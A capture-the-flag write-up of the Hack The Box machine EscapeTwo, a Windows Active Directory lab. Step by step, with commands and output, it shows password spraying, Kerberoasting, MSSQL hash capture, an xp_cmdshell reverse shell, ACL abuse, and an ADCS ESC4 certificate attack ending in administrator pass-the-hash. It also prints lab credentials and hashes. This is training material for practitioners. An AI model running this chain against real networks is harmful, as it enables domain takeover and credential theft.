---
title: HTB EscapeTwo
date: 2025-01-12 08:50:00 +/-TTTT
categories: [Hackthebox, Windows]
tags: [ldap, mssql, writeowner]     # TAG names should always be lowercase
description: Active Directory box focused on enumeration techniques via SMB, LDAP, and MSSQL, requiring privilege escalation through misconfigured AD objects

image:
  path: assets\escapetwo\cropped-box-escapetwo.png
---



### Introduction
This write-up shows a Windows AD box on `sequel.htb`, covering initial access to full domain compromise. Techniques include SMB enumeration, LDAP abuse, MSSQL exploitation, and tools like BloodHound, Certipy, and Impacket for privilege escalation.

## Initial Enumeration

---
### Nmap Scan
```python
nmap -sCV 10.129.178.194            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 20:45 UTC
Nmap scan report for 10.129.178.194
Host is up (0.012s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-11 20:44:49Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T20:46:08+00:00; -52s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T20:46:08+00:00; -52s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.178.194:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.178.194:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-11T20:46:08+00:00; -52s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-11T19:59:57
|_Not valid after:  2055-01-11T19:59:57
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T20:46:08+00:00; -52s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T20:46:08+00:00; -52s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
|
Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_clock-skew: mean: -52s, deviation: 0s, median: -52s
```
> Many ports show up that associate with a domain controller and we find the domain + hostname: `DC01.sequel.htb` `sequel.htb` `DC01`

---
### SMB
A normal command syntax didn't allow me to authenticate on SMB so the following command was used:  
```sh
smbclient //10.129.178.194/Users -U sequel.htb\\rose         
Password for [SEQUEL.HTB\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jun  9 13:42:11 2024
  ..                                 DR        0  Sun Jun  9 13:42:11 2024
  Default                           DHR        0  Sun Jun  9 11:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 07:16:48 2018
```
Later I found out we could have authenticated by using the hostname:
```sh
smbclient //dc01.sequel.htb/users -U rose --password KxEPkKe6R8su
```
#### Extracting files from share
```sh
smbclient //10.129.178.194/Users -U sequel.htb\\rose         
Password for [SEQUEL.HTB\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jun  9 13:42:11 2024
  ..                                 DR        0  Sun Jun  9 13:42:11 2024
  Default                           DHR        0  Sun Jun  9 11:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 07:16:48 2018

		6367231 blocks of size 4096. 925003 blocks available
smb: \> cd default
smb: \default\> ls
  .                                 DHR        0  Sun Jun  9 11:17:29 2024
  ..                                DHR        0  Sun Jun  9 11:17:29 2024
  AppData                            DH        0  Sat Sep 15 07:19:00 2018
  Links                              DR        0  Sat Sep 15 07:19:00 2018
  Music                              DR        0  Sat Sep 15 07:19:00 2018
  NTUSER.DAT                          A   262144  Sun Jun  9 01:29:57 2024
  NTUSER.DAT.LOG1                   AHS    57344  Sat Sep 15 06:09:26 2018
  NTUSER.DAT.LOG2                   AHS        0  Sat Sep 15 06:09:26 2018
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Sun Jun  9 01:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Jun  9 01:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Jun  9 01:29:57 2024
  Pictures                           DR        0  Sat Sep 15 07:19:00 2018
  Saved Games                         D        0  Sat Sep 15 07:19:00 2018
  Videos                             DR        0  Sat Sep 15 07:19:00 2018

```


#### Creds
Found credentials in the Excel file after unzipping them. 
![[Pasted image 20250112130014.png]]
File: `sharedStrings.xml`

potential passwords found which will be added to files for spraying;
```
MSSQLP@ssw0rd!
86LxLBMgEWaKUnBG
86LxLBMgEWaKUnBG
0fwz7Q4mSpurIt99
```

#### Enumerated users with nxc
```sh
nxc smb 10.129.178.194 -u rose -p KxEPkKe6R8su --users
```
After cleanup:
```
angela
martin
oscar
martinez
kevin
malone
sa
```


#### Password spray
```sh
netexec mssql dc01.sequel.htb -u users -p passwords --continue-on-success --local-auth | grep -F [+]
```

```sh
[+] sequel.htb\oscar:86LxLBMgEWaKUnBG 

and added with --local-auth

[+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```
---
### LDAP 
Enumerating ADCS:
```sh
nxc ldap 10.129.178.194 -u users -p pass -M adcs       
SMB         10.129.178.194  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.129.178.194  389    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
ADCS        10.129.178.194  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.178.194  389    DC01             Found PKI Enrollment Server: DC01.sequel.htb
ADCS        10.129.178.194  389    DC01             Found CN: sequel-DC01-CA
```
#### Bloodhound
Ran bloodhound ingestor with nxc:
```sh
nxc ldap 10.129.178.194 -u rose -p KxEPkKe6R8su --kdcHost dc01.sequel.htb --dns-server 10.129.178.194 --bloodhound --collection All
```
Then when enumerating the bloodhoud, there was a kerberoastable account.

#### Kerberoasting
```sh
GetUserSPNs.py sequel.htb/rose -request
```
I was not able to crack these hashes. 


---
### MSSQL Access
The given credentials do work for MSSQL:
```sh
netexec mssql 10.10.11.51 -u rose -p KxEPkKe6R8su

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] sequel.htb\rose:KxEPkKe6R8su
```

Run xp_dirtree to get the hash:
```sh
xp_dirtree \\10.10.14.149\hacker
```
Camping it out with responder:
```sh
responder -I tun0 -A
```
#### Hash captured
```python
sql_svc::SEQUEL:48a8d2c60c5a4fba:E35F0CC70BAB2C7005D0350439E59215:0101000000000000007C22F2EB64DB01CD4B780DFFEE36B20000000002000800420048005500390001001E00570049004E002D004B004200430045004200310043004A0055003300440004003400570049004E002D004B004200430045004200310043004A005500330044002E0042004800550039002E004C004F00430041004C000300140042004800550039002E004C004F00430041004C000500140042004800550039002E004C004F00430041004C0007000800007C22F2EB64DB0106000400020000000800300030000000000000000000000000300000EFB3ACEF8632A37DA65024758F421B8A13319B2B935B316B3EFEE9DCCA6576A10A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100340039000000000000000000
```
Could not crack this hash. 

Run xp_cmdshell for a reverse shell:
```powershell
xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0A<snip>"
```
All you need for this is the correct port to listen on by using the base64 encoded shell from revshells. 

----
### Initial access
#### Creds
The above command gave us initial access and after some manual enumeration I found another password:
```
WqSZAF6CysDQbGb3
sql_svc
```
#### Passswords spray
```sh
[+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
[+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
[+] sequel.htb\rose:KxEPkKe6R8su
[+] sequel.htb\oscar:86LxLBMgEWaKUnBG

winrm got pwned:
[+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

---
#### User flag
evil-winrm for the user flag with above creds

---
### Enumeration
Lets mark ryan as pwned and see what we can do from here in bloodhound: 
![[Pasted image 20250112142017.png]]
Ryan has `writeowner` over ca_svc^^^ if we check first degree object control in bloodhound.
![[Pasted image 20250112142245.png]]

---
### Privilege escalation
Change the ownership of the `ca_svc` user in AD to user ryan:
```sh
owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.68.169

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Grant `ryan` full control over the `ca_svc` user by modifying its Discretionary ACL (DACL):
```sh
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.68.169

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20250112-132903.bak
[*] DACL modified successfully!
```

Validate that `ryan` is the owner of `ca_svc`, but `ryan` is already the owner, which is good:
```sh
python bloodyAD.py --host dc01.sequel.htb -d sequel -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan

[!] S-1-5-21-548670397-972687484-3496335370-1114 is already the owner, no modification will be made
```

Grant `ryan` the `GenericAll` permission, allowing full  access to `ca_svc`.
```sh
python bloodyAD.py --host dc01.sequel.htb -d sequel -u ryan -p 'WqSZAF6CysDQbGb3' add genericAll ca_svc ryan

[+] ryan has now GenericAll on ca_svc
```

Change the password of the `ca_svc` account to `newP@ssword2022`.
```sh
net rpc password "ca_svc" "newP@ssword2022" -U "SEQUEL"/"ryan"%"WqSZAF6CysDQbGb3" -S "dc01.sequel.htb"
```

Enumerate certificate templates and their permissions, identifying an issue with the `DunderMifflinAuthentication` template.
```sh
certipy-ad  find -u ca_svc@sequel.htb -p newP@ssword2022 -dc-ip 10.129.68.169 -vulnerable -text -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

Update the vulnerable `DunderMifflinAuthentication`  template from the output above and then saves the original configuration to a `.json` file.
```sh
certipy-ad template -username ca_svc@sequel.htb -password newP@ssword2022 -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

Request a certificate for the `administrator@sequel.htb` user using the vulnerable template and saves the certificate and private key in a `.pfx` file.
```sh
certipy-ad req -username ca_svc@sequel.htb -password newP@ssword2022 -ca sequel-DC01-CA -target sequel.htb -template DunderMifflinAuthentication  -upn administrator@sequel.htb -dns 10.129.68.169
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: '10.129.68.169'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```

Lastly we authenticate as `administrator` user using the `.pfx` file, retrieving a TGT (Ticket Granting Ticket) and NT hash for the `administrator`.
```sh
certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.129.68.169
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: '10.129.68.169'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

---
#### Root flag
pass the hash with winrm
